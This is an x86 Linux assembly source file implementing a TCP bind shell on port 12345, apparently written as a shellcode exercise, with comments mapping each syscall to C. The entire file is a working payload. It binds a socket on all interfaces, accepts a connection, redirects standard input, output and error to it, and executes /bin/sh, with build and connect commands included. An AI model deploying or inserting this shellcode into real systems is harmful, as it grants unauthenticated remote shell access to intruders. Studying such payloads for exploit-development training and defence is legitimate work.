; TCP Bind shell for Linux x86 architecture
;  (@_Kiewicz)
; GPL License
; Defaults to port 12345 
; $ nasm -f elf32 bind_shell.asm -o bind_shell.o
; $ ld -o bind_shell bind_shell.o
; ./bind_shell &
; nc -v localhost 12345

global _start

section .text
_start:
		; First we zero out the registers
		xor ebx, ebx
		xor ecx, ecx
		xor esi, esi       
		mul ebx

		; Next, we build the socket fd with its corresponding syscall
		; socketcall = 102, socketcall type = 1 (sys_socket)
		; IPv4 and TCP (0)
		; sockfd = socket(AF_INET, SOCK_STREAM, 0);
		
		mov al, 0x66 				; socketcall syscall = 102 (decimal)
		mov bl, 0x1  	 				; sys_socket (socketcall)
		push ecx    	    				; TCP
		push 0x1						; SOCK_STREAM
		push 0x2						; AF_INET
		
		mov ecx, esp					; address (pointer) of the array
		int 0x80							; interrupt vector (syscall)
		
		mov edx, eax				; socket fd
		
		; To avoid sigsegv if reconnecting we set this option and reuse the socket address 
		; // syscall socketcall (sys_setsockopt 14)
        ; int slength = 1;
        ; setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &slength, sizeof(one));
		mov al, 0x66 
		mov bl, 0xe					; socketcall (sys_setsockopt)
		push 0x4 						; slength (socket length)
		push esp
		push 0x2						; SO_REUSEADDR
		push 0x1						; SOL_SOCKET
		push edx						; previous socket fd
		mov ecx, esp					; address (pointer) of the array
		int 0x80							
		
		
		; // binding
 		; bind_address.sin_family = AF_INET; // = 2
 		; bind_address.sin_port = htons(port); // port = 12345
 		; bind_address.sin_addr.s_addr = INADDR_ANY; // NULLL (no IP)
 		mov al, 0x66
		mov bl, 0x2					; socketcall (sys_bind)
		xor ecx, ecx					; zeroed out to push it as inaddr_any
		push cx   						; INADDR_ANY (null since it's bind)
		push WORD 0x3930	; port = 0x3039 = 12345
		push WORD 0x2			; AF_INET
		mov ecx, esp					; pointer 
		
		; bind(sockfd, (struct sockaddr *) &bind_address, sizeof(bind_address));
		; arguments from socket.h
		push 0x10						; socklen_t
		push ecx						; *sockaddr_in 
		push edx						; fd
		mov ecx, esp					
		int 0x80
		
		; // syscall listen = 363
 		; listen(sockfd, 0);
 		mov al, 0x66
 		mov bl, 0x4					; socketcall sys_listen
 		push esi						; second argument
 		push edx						; fd
 		int 0x80
 
 
		 ; // syscall socketcall (sys_accept 5)
		 ; resultfd = accept(sockfd, NULL, NULL);
		mov al, 0x66
		mov bl, 0x5					; sys_accept
		push esi						; first NULL
		push esi						; second NULL
		push edx						; fd
		mov ecx, esp
		int 0x80
		mov edx, eax				; save fd
		
		; // syscall dup2 = 63
		; dup2(resultfd, 2);
		; dup2(resultfd, 1);
		; dup2(resultfd, 0);
		
		mov al, 0x3f					; syscall dup2 = 63
		mov ebx, edx				; client fd
		mov ecx, esi					; stdin
		int 0x80
		
		mov al, 0x3f
		mov cl, 0x1					; stdout
		int 0x80
		
		mov al, 0x3f
		mov cl, 0x2					; stderr
		int 0x80
		
		
		; // syscall execve = 11
 		; execve("/bin/sh", NULL, NULL);
 		; We will push the string ‘//bin/sh 0x00 &addr 0x00’ (in reverse order)
		mov al, 0xb					; execve syscall = 11
		push esi
		push 0x68732f2f			; //sh
		push 0x6e69622f		; /bin
		mov ebx, esp				; address of //bin/sh string
		mov ecx, esi					; argv
		mov edx, esi				; envp
		int 0x80
